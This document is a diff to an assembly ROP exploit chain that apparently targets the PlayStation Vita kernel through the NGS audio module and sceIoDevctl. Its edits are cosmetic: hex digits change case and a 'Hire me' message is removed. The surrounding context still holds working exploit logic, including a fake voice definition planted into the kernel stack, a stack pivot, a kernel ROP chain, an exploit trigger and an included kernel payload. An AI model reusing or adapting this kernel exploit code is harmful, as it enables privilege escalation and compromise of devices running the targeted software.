@@ -18,15 +18,15 @@
 
 // Layout for voice definition
 .equ FAKE_COPYOUT_OFFSET,    0x40
-.equ FAKE_COPYOUT_SIZE,      0xa0
+.equ FAKE_COPYOUT_SIZE,      0xA0
 .equ OVERWRITE_OFFSET,       0x40
 .equ OVERWRITE_SIZE,         0x64
-.equ FAKE_HEADER_OFFSET,     0xb0
+.equ FAKE_HEADER_OFFSET,     0xB0
 .equ FAKE_HEADER_SIZE,       0x80
 .equ PRESET_LIST_OFFSET,     0x130
 
 // copyout params offset
-.equ COPYOUT_PARAMS_OFFSET,  0xa0
+.equ COPYOUT_PARAMS_OFFSET,  0xA0
 
 #include "offsets.S"
 
@@ -83,7 +83,7 @@ _start:
   call_vv sceDisplaySetFrameBuf, framebuf, SCE_DISPLAY_SETBUF_NEXTFRAME
 
   // Flash white
-  call_lvv memset, framebuf + 0x04, 0xff, 960 * 544 * 4
+  call_lvv memset, framebuf + 0x04, 0xFF, 960 * 544 * 4
 
   // Get SceLibKernel base address
   call_v   sceIoOpen, 0xDEADBEEF
@@ -102,12 +102,12 @@ _start:
 
   // Get first entry of module list which should be SceNgsUser
   store_vv      1, mod_count
-  load_call_vvv sceKernelGetModuleList, 0xff, mod_list, mod_count
+  load_call_vvv sceKernelGetModuleList, 0xFF, mod_list, mod_count
 
   // Get SceNgsUser base address
-  store_vv     0x1b8, mod_info + 0x00
+  store_vv     0x1B8, mod_info + 0x00
   load_call_lv sceKernelGetModuleInfo, mod_list + 0x00, mod_info
-  store_lv     mod_info + 0x15c, ngs_base
+  store_lv     mod_info + 0x15C, ngs_base
 
   // Get SceNgsUser functions
   load_add_store sceNgsSystemGetRequiredMemorySize, ngs_base, SYSTEM_GET_SIZE_OFFSET
@@ -133,10 +133,10 @@ _start:
   store_vv SCE_NGS_VOICE_DEFINITION_MAGIC, voice_def_buf + 0x00
   store_vv SCE_NGS_VOICE_DEFINITION_FLAGS, voice_def_buf + 0x04
   store_vv 0x40,                           voice_def_buf + 0x08
-  store_vv 0x40,                           voice_def_buf + 0x0c
+  store_vv 0x40,                           voice_def_buf + 0x0C
 
   // Plant fake voice definition into kernel stack
-  load_call_vvvvvv sceIoDevctl, empty_string, 0, voice_def_buf, 0x3ff, NULL, 0
+  load_call_vvvvvv sceIoDevctl, empty_string, 0, voice_def_buf, 0x3FF, NULL, 0
 
   // Iterate through kernel memory
   loop_start:
@@ -157,7 +157,7 @@ _start:
     mul_add_rvv ret, loop_start - loop_end, loop_end
 
     // Stack pivot
-    store_rv         ret, ldm_data_r0 + 0x0c
+    store_rv         ret, ldm_data_r0 + 0x0C
     set_r0_r2_ip_sp_lr_pc ldm_data_r0
   loop_end:
 
@@ -179,7 +179,7 @@ _start:
   store_vv sysmem_base, voice_def_buf + FAKE_COPYOUT_OFFSET + 0x04 // dst
   add_lv   kstack_base, KSTACK_SYSMEM_OFFSET
   store_rv ret,         voice_def_buf + FAKE_COPYOUT_OFFSET + 0x08 // src
-  store_vv 4,           voice_def_buf + FAKE_COPYOUT_OFFSET + 0x1c // len
+  store_vv 4,           voice_def_buf + FAKE_COPYOUT_OFFSET + 0x1C // len
 
   // Trigger exploit
   trigger_exploit
@@ -197,7 +197,7 @@ _start:
   set_preset_dummy 0, -KSTACK_DEVCTL_INDATA_OFFSET, 0x1000
 
   // Plant fake voice definition into kernel stack
-  load_call_vvvvvv sceIoDevctl, empty_string, 0, voice_def_buf, 0x3ff, NULL, 0
+  load_call_vvvvvv sceIoDevctl, empty_string, 0, voice_def_buf, 0x3FF, NULL, 0
 
   // Determine memory requirement for rack
   load_call_lvv sceNgsRackGetRequiredMemorySize, sys_handle, rack_desc, buffer_info + 0x04
@@ -231,7 +231,7 @@ _start:
   store_rv     ret, thread_id
 
   // Get thread stack base address
-  store_vv     0x7c, thread_info + 0x00
+  store_vv     0x7C, thread_info + 0x00
   load_call_lv sceKernelGetThreadInfo, thread_id, thread_info
   store_lv     thread_info + 0x34, thread_stack_base
 
@@ -259,7 +259,7 @@ _start:
   // Exit and delete thread once the syscall returns back to user
   store_lv thread_stack_base,         voice_def_buf + OVERWRITE_OFFSET + 0x54 // sp
   store_vv pop_pc,                    voice_def_buf + OVERWRITE_OFFSET + 0x58 // lr
-  store_vv sceKernelExitDeleteThread, voice_def_buf + OVERWRITE_OFFSET + 0x5c // pc
+  store_vv sceKernelExitDeleteThread, voice_def_buf + OVERWRITE_OFFSET + 0x5C // pc
 
   // Fake header to force an early termination, such that we can avoid any possible crashes
   call_vvv memset, voice_def_buf + FAKE_HEADER_OFFSET, 0, FAKE_HEADER_SIZE
@@ -286,7 +286,7 @@ _start:
 // Thread rop chain
 thread_rop_start:
   // Plant kernel rop chain into kernel stack
-  load_call_vvvvvv sceIoDevctl, empty_string, 0, krop_buf, 0x3ff, NULL, 0
+  load_call_vvvvvv sceIoDevctl, empty_string, 0, krop_buf, 0x3FF, NULL, 0
 
   // After 100ms the syscall will pop the overwritten return address from kernel stack
   call_v sceKernelDelayThread, 100 * 1000
@@ -336,16 +336,12 @@ rack_desc:                         .word 0xDEADBEEF // pVoiceDefn
                                    .word 0          // nPatchesPerOutput
                                    .word 0          // pUserReleaseData
 
-// Message :)
-message:                           .word 0xDEADBEEF
-                                   .string "Hi Sony! Hire me :)"
-
 // Kernel payload
 payload_start:
 .incbin "payload.bin"
 payload_end:
 .set payload_size, payload_end - payload_start
-.balign 0x4
+.balign 0x04
 
 // Base addresses
 kstack_base:                       .word KSTACK_BASE_START - KSTACK_BASE_STEP + KSTACK_DEVCTL_INDATA_OFFSET
@@ -368,13 +364,13 @@ sceNgsRackRelease:                 .word 0
 
 // Module variables
 mod_count:                         .word 0
-mod_list:                          .zero 0x4
-mod_info:                          .zero 0x1b8
+mod_list:                          .zero 0x04
+mod_info:                          .zero 0x1B8
 
 // Thread variables
 thread_id:                         .word 0
 thread_stack_base:                 .word 0
-thread_info:                       .zero 0x7c
+thread_info:                       .zero 0x7C
 
 // Ngs system variables
 sys_handle:                        .word 0
